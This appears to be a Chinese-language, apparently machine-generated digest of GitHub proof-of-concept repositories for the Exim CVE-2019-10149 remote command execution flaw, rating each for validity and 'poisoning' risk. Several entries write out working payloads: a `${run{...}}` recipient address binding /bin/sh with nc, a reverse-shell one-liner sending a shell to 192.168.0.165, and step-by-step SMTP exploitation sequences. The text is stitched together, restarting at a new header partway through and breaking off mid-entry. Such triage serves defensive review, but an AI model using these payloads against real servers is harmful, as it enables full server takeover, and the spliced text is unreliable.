CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

